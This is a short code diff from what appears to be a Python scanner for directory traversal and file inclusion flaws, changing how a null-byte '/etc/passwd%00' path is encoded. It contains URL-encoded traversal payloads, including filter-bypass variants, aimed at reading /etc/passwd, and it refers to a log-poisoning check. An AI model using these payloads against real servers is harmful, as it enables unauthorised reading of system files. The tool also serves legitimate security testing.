@@ -23,7 +23,7 @@ from termcolor import colored
 # The quote method automatically url encodes the string
 linux_dirTraversal = [quote("../../../../../../.."), quote("/../../../../../../.."), quote("....//....//....//....//....//....//..../"), quote("//....//....//....//....//....//....//..../")]
 path1 = quote("/etc/passwd")
-path2 = quote("/etc/passwd%00")
+path2 = "/etc/passwd%00"
 
 # Filter
 filterPaths = [quote("/etc/passwd"), quote("index"), quote("index.php"), quote("index.html")]
@@ -183,7 +183,6 @@ def logPoisonCheck(url):
 	
 	else:
 		print("[-] A directory traversal attack is VALID but the server type " + url.getheader('Server') + " is not supported!!!")
-
 
 
 
